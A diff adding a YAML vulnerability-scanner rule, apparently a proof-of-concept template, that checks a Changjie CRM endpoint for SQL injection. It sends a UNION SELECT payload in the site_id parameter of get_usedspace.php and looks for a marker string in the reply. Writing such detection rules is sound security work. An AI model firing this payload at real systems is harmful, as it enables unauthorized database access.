@@ -1,0 +1,11 @@
+name: changjie-CRM-sql
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x6f6c6436,0x6f6c6436,0x6f6c6436)--
+    expression: response.status == 200 && response.body.bcontains(b'old6old6old6')
+expression: r0()
+detail:
+  links:
+    - https://mp.weixin.qq.com/s/ZjjXqN1RDeOQIH9ueTPymQ
